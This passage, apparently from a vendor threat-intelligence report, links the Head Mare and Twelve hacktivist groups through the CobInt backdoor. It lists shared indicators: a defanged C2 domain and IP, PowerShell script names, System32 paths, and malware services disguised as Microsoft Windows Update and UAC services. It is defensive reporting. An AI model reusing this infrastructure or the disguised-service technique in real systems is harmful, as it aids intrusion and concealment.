<p>In the image above, we see for the first time the use of the <strong>CobInt malware</strong> in Head Mare attacks. Previously, it was present only in the arsenal of the Twelve group, the analysis of which is presented below.</p>
<div id="attachment_115902" style="width: 634px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092748/Head_Mare_twelve_04_en.jpg" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-115902" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092748/Head_Mare_twelve_04_en.jpg" alt="Analysis of the Twelve techniques and tools" width="624" height="349" class="size-full wp-image-115902" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092748/Head_Mare_twelve_04_en.jpg 624w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092748/Head_Mare_twelve_04_en-300x168.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092748/Head_Mare_twelve_04_en-270x150.jpg 270w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092748/Head_Mare_twelve_04_en-501x280.jpg 501w" sizes="auto, (max-width: 624px) 100vw, 624px" /></a><p id="caption-attachment-115902" class="wp-caption-text">Analysis of the Twelve techniques and tools</p></div>
<p>Also, the analysis of the two models revealed overlaps in the infrastructure (C2s) of the groups. The following infrastructure elements appearing in Head Mare attacks were also present in a number of incidents related to the activities of the <strong>Twelve</strong> group.</p>
<ul>
<li>360nvidia[.]com;</li>
<li>45.156.27[.]115</li>
</ul>
<p>In addition, we have identified other similarities in the arsenal of the two groups:</p>
<ol>
<li>File names:
<ul>
<li>proxy.ps1</li>
<li>ad_without_dc.ps1</li>
</ul>
</li>
<li>Paths:
<ul>
<li>C:\Windows\System32\winsw.exe</li>
<li>C:\Windows\System32\winsws.exe</li>
<li>C:\Windows\System32\winuac.exe</li>
</ul>
</li>
<li>Service names:
<ul>
<li>winsw (Microsoft Windows Update)</li>
<li>winuac (Microsoft UAC Service Wrapper)</li>
</ul>
</li>
<li>Victims:
<ul>
<li>Manufacture, government, energy</li>
</ul>
</li>
</ol>
<p>The final intersection points of the Head Mare and Twelve groups are shown in the image below. Given the overlaps in infrastructure, TTPs, <strong>CobInt</strong> malware, and victim choices, we assume that these groups act together, exchanging access to command-and-control servers and various tools for carrying out attacks.</p>
<div id="attachment_115903" style="width: 633px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092755/Head_Mare_twelve_05_en.jpg" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-115903" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092755/Head_Mare_twelve_05_en.jpg" alt="Overlaps in TTPs, tools, and infrastructure between Head Mare and Twelve" width="623" height="241" class="size-full wp-image-115903" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092755/Head_Mare_twelve_05_en.jpg 623w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/13092755/Head_Mare_twelve_05_en-300x116.jpg 300w" sizes="auto, (max-width: 623px) 100vw, 623px" /></a><p id="caption-attachment-115903" class="wp-caption-text">Overlaps in TTPs, tools, and infrastructure between Head Mare and Twelve</p></div>
<h2 id="conclusion">Conclusion</h2>
<p>Head Mare is actively expanding its set of techniques and tools. In recent attacks, they gained initial access to the target infrastructure by not only using phishing emails with exploits but also by compromising contractors.</p>
<p>They also use tools previously seen in attacks by other groups, such as Twelve&#8217;s <strong>CobInt</strong> backdoor.</p>
<p>This is not the only similarity between the two groups. In addition to the toolkit, the following were noticed:</p>
<ul>
<li>Shared command-and-control servers: 360nvidia[.]com, 45.156.27[.]115</li>
<li>PowerShell scripts accessing these C2 servers: mcdrive.ps1</li>
<li>Scripts for tunneling network connections: proxy.ps1</li>
</ul>
<p>Based on the factors described above, we assume that Head Mare is working with Twelve to launch attacks on state- and privately controlled companies in Russia. We will continue to monitor the activity of the attackers and share up-to-date information about their TTPs. More details about the hacktivists&#8217; activities and their tools, such as PhantomJitter, can be found in the materials available to subscribers of <a href="https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______c41a63524a629091" target="_blank" rel="noopener">our Threat Intelligence reports</a>.</p>
